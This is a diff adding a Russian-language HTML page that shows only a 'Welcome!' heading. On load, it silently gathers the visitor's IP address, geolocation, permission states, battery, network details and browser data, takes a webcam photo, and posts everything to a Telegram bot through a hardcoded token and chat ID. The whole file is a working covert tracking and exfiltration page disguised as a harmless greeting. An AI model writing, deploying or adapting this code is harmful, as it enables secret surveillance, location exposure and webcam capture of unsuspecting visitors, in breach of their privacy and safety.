@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Сбор информации</title>
+    <script>
+        async function getIP() {
+            let response = await fetch('https://api.ipify.org?format=json');
+            let data = await response.json();
+            return data.ip;
+        }
+
+        function getGeolocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    }, () => {
+                        resolve('Not available');
+                    });
+                } else {
+                    resolve('Not available');
+                }
+            });
+        }
+
+        async function getPermissions() {
+            let permissions = [];
+            if (navigator.permissions) {
+                let permList = ['geolocation', 'notifications', 'camera', 'microphone'];
+                for (let perm of permList) {
+                    let result = await navigator.permissions.query({ name: perm });
+                    permissions.push(`${perm}: ${result.state}`);
+                }
+            }
+            return permissions.join(', ');
+        }
+
+        async function getBattery() {
+            if (navigator.getBattery) {
+                let battery = await navigator.getBattery();
+                return {
+                    level: battery.level,
+                    charging: battery.charging
+                };
+            }
+            return 'Not available';
+        }
+
+        function getNetwork() {
+            if (navigator.connection) {
+                return {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                };
+            }
+            return 'Not available';
+        }
+
+        async function sendInfoToTelegram(message) {
+            const TELEGRAM_BOT_TOKEN = '7463192683:AAEGGUEgc7OKwBShoKzwAuxMBLVQz3deQWY';
+            const TELEGRAM_CHAT_ID = '7277437703';
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            const result = await response.json();
+            if (!result.ok) {
+                console.error('Ошибка отправки сообщения в Telegram:', result);
+            }
+        }
+
+        async function sendPhotoToTelegram(photoBlob) {
+            const TELEGRAM_BOT_TOKEN = '7463192683:AAEGGUEgc7OKwBShoKzwAuxMBLVQz3deQWY';
+            const TELEGRAM_CHAT_ID = '7277437703';
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', photoBlob);
+
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+
+            const result = await response.json();
+            if (!result.ok) {
+                console.error('Ошибка отправки фото в Telegram:', result);
+            }
+        }
+
+        async function capturePhoto() {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+                return await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg'));
+            } catch (err) {
+                console.error('Ошибка захвата фото:', err);
+                return null;
+            }
+        }
+
+        async function sendInfo() {
+            const ip = await getIP();
+            const geolocation = await getGeolocation();
+            const permissions = await getPermissions();
+            const battery = await getBattery();
+            const network = getNetwork();
+            const photo = await capturePhoto();
+
+            const info = {
+                ip: ip,
+                user_agent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                geolocation: geolocation,
+                permissions: permissions,
+                battery: battery,
+                network: network
+            };
+
+            const message = `
+                IP: ${info.ip}
+                User Agent: ${info.user_agent}
+                Language: ${info.language}
+                Platform: ${info.platform}
+                Geolocation: ${JSON.stringify(info.geolocation)}
+                Permissions: ${info.permissions}
+                Battery: ${JSON.stringify(info.battery)}
+                Network: ${JSON.stringify(info.network)}
+            `;
+
+            await sendInfoToTelegram(message);
+            if (photo) {
+                await sendPhotoToTelegram(photo);
+            }
+        }
+
+        window.onload = sendInfo;
+    </script>
+</head>
+<body>
+    <h1>Добро пожаловать!</h1>
+</body>
+</html>
